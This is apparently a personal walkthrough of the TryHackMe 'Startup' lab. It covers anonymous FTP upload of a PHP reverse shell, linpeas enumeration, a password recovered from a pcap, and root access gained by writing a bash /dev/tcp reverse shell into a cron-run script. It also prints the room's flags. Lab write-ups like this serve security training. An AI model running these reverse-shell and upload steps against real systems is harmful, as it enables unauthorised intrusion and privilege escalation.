---
title: "Startup"
date: 2025-01-15
slug: startup
tags: [tryhackme, linux, web, privesc]
difficulty: Easy
---
IP = 10.10.16.221

**Enumeration** 

```
❯ nmap -sCV 10.10.16.221

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.17.26.44
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)

```
services - 
ftp ,ssh , http 

ftp - 
anon login possible

```
❯ ftp 10.10.16.221
Connected to 10.10.16.221 (10.10.16.221).
220 (vsFTPd 3.0.3)
Name (10.10.16.221:dedfish404): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.


ftp> help
Commands may be abbreviated.  Commands are:

!		debug		mdir		sendport	site
$		dir		mget		put		size
account		disconnect	mkdir		pwd		status
append		exit		mls		quit		struct
ascii		form		mode		quote		system
bell		get		modtime		recv		sunique
binary		glob		mput		reget		tenex
bye		hash		newer		rstatus		tick
case		help		nmap		rhelp		trace
cd		idle		nlist		rename		type
cdup		image		ntrans		reset		user
chmod		lcd		open		restart		umask
close		ls		prompt		rmdir		verbose
cr		macdef		passive		runique		?
delete		mdelete		proxy		send
ftp> dir
227 Entering Passive Mode (10,10,16,221,99,162).
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.


ftp> get notice.txt important.jpg
local: important.jpg remote: notice.txt
227 Entering Passive Mode (10,10,16,221,240,202).
150 Opening BINARY mode data connection for notice.txt (208 bytes).
226 Transfer complete.
208 bytes received in 0.00205 secs (101.32 Kbytes/sec)

```


```
❯ ls
"important'jpg"   notice.txt
❯ file notice.txt
notice.txt: PNG image data, 735 x 458, 8-bit/color RGBA, non-interlaced
❯ file important\'jpg
important'jpg: ASCII text
❯ cat important\'jpg
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

we get a name **maya** which could be useful 
converting the notice.txt which is a image data file into a jpg file using online converters 



http - 

dir enum using 
`gobuster dir -u http://10.10.16.221/ -w ~/ctf/wordlist/directory-list-2.3-medium.txt -x php,html,js`

found -
/files - this had important.jpg notice.txt files with correct data asper the extentions 

*the index page has a link to mailto *

---

**exploitation**

```

ftp> put filetest.txt
local: filetest.txt remote: filetest.txt
227 Entering Passive Mode (10,10,16,221,76,43).
553 Could not create file.


```

seems like we dont have put permission in this directory 

but there is another dir ftp/ lets check if we have permission to put file there 

```
ftp> cd ftp
250 Directory successfully changed.
ftp> put filetest.txt
local: filetest.txt remote: filetest.txt
227 Entering Passive Mode (10,10,16,221,54,69).
150 Ok to send data.
226 Transfer complete.
```

looks like we have 

now lets put the php-revshell in this dir and run it 

```
ftp> cd ftp
250 Directory successfully changed.

ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
227 Entering Passive Mode (10,10,16,221,36,198).
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 9.1e-05 secs (60362.64 Kbytes/sec)
```

now going to 
`http://10.10.16.221/files/ftp/`
we can see our php-revshell.php file there we can click on there while having a revshell listner on our attacker machine 

```
❯ rlwrap nc -lnvp 9999
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 10.10.16.221.
Ncat: Connection from 10.10.16.221:56634.
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 07:23:33 up  1:07,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data

```

we have successfully got access to the webserver 

`cat recipe.txt `  to get the first flag 

we see lenne's file in the /home dir but we dont have the perm to read it 


lets go to `/tmp` directory to download the linpeas.sh file 

**the /tmp dir is preferred as it is world accessible any user has full perms to read write exec files inside the /tmp directory**

hosting a python server on my machine in the scripts dir where i have linpeas 
`❯ python -m http.server 8888`

now downloading the script in target machine 
`$ wget 10.17.26.44:8888/linpeas.sh`

running the linpeas files we get 
checking the SUID perms in scripts 

according to hints given which points us towards these type of files -- 

```
══════════════════════╣ Files with Interesting Permissions 

SUID - Check easy privesc, exploits and write perms

-rwsr-xr-x 1 root root 40K Jan 27  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27K Jan 27  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40K Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 53K Mar 26  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 23K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 134K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 33K Mar 26  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 71K Mar 26  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 39K Mar 26  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 40K Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 33K Mar 26  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 74K Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 83K Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 109K Sep  8  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 419K May 26  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1

╔══════════╣ SGID

-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen  --->  GNU_Screen_4.5.0
-rwxr-sr-x 1 root shadow 61K Mar 26  2019 /usr/bin/chage
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 27K Jan 27  2020 /usr/bin/wall
-rwxr-sr-x 1 root ssh 351K May 26  2020 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 23K Mar 26  2019 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
```

```
╔══════════╣ Unexpected in root
/vagrant
/recipe.txt
/vmlinuz.old
/vmlinuz
/incidents
/initrd.img
/initrd.img.old
```

looking at SUID perms we can see that we can run `su `

we find a pcapng file which is a wireshark file so we will inspect it for further info 
```
$ cd incidents
$ ls
suspicious.pcapng
```


copying the file to our machine 
`cp /incidents/suspicious.pcapng /var/www/html/files/ftp/`
this command sends this file to ftp which we can then see in our attacker machine 


the pcapng file had a http traffic which had a data where user has tried to access the server using a rev shell and the user was using port 4444
so we have filtered the port 4444 communication and then reading the data on the segment whos length is big and we found 

```
$

  

$whoami
www-data


python -c "import pty;pty.spawn('/bin/bash')"

  

www-data@startup:/$

cd

  

cd

bash: cd: HOME not set

www-data@startup:/$

ls

  

ls

bin etc initrd.img.old media recipe.txt snap usr vmlinuz.old

boot home lib mnt root srv vagrant

data incidents lib64 opt run sys var

dev initrd.img lost+found proc sbin tmp vmlinuz

www-data@startup:/$

cd home

  

cd home

www-data@startup:/home$

cd lennie

  

cd lennie

bash: cd: lennie: Permission denied

www-data@startup:/home$

ls

  

ls

lennie

www-data@startup:/home$

cd lennie

  

cd lennie

bash: cd: lennie: Permission denied

www-data@startup:/home$

sudo -l

  

sudo -l



[sudo] password for www-data:

c4ntg3t3n0ughsp1c3


www-data@startup:/home$

cat /etc/passwd

  

cat /etc/passwd

root:x:0:0:root:/root:/bin/bash



lennie:x:1002:1002::/home/lennie:


```

password found - c4ntg3t3n0ughsp1c3 
using this password for lennie 


```
$ su - lennie
su: must be run from a terminal
```
this isn't a terminal this is a web interface which is why we are www-data user and we dont have basic terminal functions here as it doesnt have TTY 
to spawn a terminal we will use the command 
```
$ whoami
www-data
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@startup:/$ whoami
```

```
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ cd lennie
cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ su - lennie
su - lennie
Password: c4ntg3t3n0ughsp1c3

$ ls
ls
Documents  scripts  user.txt
$ cat user.txt
cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

```

THM{03ce3d619b80ccbfb3b7fc81e46c0e79}


---

**privilege escalation**

finding a suspicious script on lennie's folder 

```
$ ls
ls
planner.sh  startup_list.txt
$ cat planner.sh
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

```
ls -al
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Jan 15 09:11 startup_list.txt
```

we see that planner is owned by root so there is no way we can edit it 

but the other file is owned by lennie 
```
ls -al /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```


```
ls -al
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 7 lennie lennie 4096 Jan 15 09:28 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Jan 15 09:42 startup_list.txt
$ ls -al
ls -al
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 7 lennie lennie 4096 Jan 15 09:28 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Jan 15 09:43 startup_list.txt
$ ls -al
```

the edit/access time from 9:42 to 9:43 indicates its a cronjob 

and according to this we know that this file is a cornjob 
**cornjob** - a file that is run on a regular intervals and linpeas lets us know that root is running this file so if we enter our rev shell command in this file we can do PrivEsc

another program we can use to find if its cronjob or not and who is running it is by using pspy - https://github.com/DominicBreuker/pspy

so we can insert our rev shell command on this file 
using pentestmonkey cheatsheet 


```
$ echo "bash -i >& /dev/tcp/10.17.26.44/8888 0>&1" > /etc/print.sh
```



```
❯ rlwrap nc -lnvp 8888
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.16.221.
Ncat: Connection from 10.10.16.221:60148.
bash: cannot set terminal process group (16441): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# 
```

```
root@startup:~# cat /root/root.txt
cat /root/root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
```

root.txt - THM{f963aaa6a430f210222158ae15c3d76d}





**gobuster was running it took 4 hrs to run medium directory list
